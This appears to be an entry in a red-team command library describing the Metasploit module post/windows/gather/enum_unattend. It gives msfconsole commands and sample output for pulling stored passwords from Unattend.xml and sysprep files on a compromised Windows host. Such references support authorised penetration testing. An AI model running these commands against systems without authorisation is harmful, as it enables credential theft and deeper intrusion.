---
id: 486464b2-2a5a-430d-9d1f-f9808da83df5
name: metasploit-post-enum-unattend
type: command
executor: msfconsole
data: |-
  use post/windows/gather/enum_unattend
  set SESSION $_SESSION_ID
  run
output: null
created_at: '2023-04-06T03:56:29.080805+00:00'
updated_at: '2023-04-10T20:37:39.339735+00:00'
platforms:
  - Windows
tags:
  - post-exploitation
  - credential-access
verified: true
validated: true
---

# metasploit-post-enum-unattend

## Command

```ruby
use post/windows/gather/enum_unattend
set SESSION $_SESSION_ID
run
```

## Description

This Metasploit post-exploitation module enumerates Unattend.xml and sysprep files on a compromised Windows host via an active Meterpreter session, parsing them for credentials like usernames and passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SESSION_ID | ID of the Meterpreter session on the target | Yes |
| SESSION | Sets the target session (alias for above) | Yes |

## Examples

### Basic Usage

In msfconsole:

```ruby
use post/windows/gather/enum_unattend
set SESSION 1
run
```

Assumes session ID 1 is active.

### Advanced Usage

With additional options if supported (check module help):

```ruby
use post/windows/gather/enum_unattend
set SESSION 1
set VERBOSE true
run
```

## Expected Output

Module results showing enumerated files and extracted data, for example:

```
[*] Running module against SESSION 1
[*] Enumerating Unattend files...
[+] C:\Windows\Panther\unattend.xml - Found password: SecretSecurePassword1234*
[+] C:\Windows\system32\sysprep\sysprep.xml - No credentials found
[*] Post module execution completed
```

## Related

- [[procedures/windows-unattend-password-extraction]]
- [[commands/powershell-decode-base64-password]]
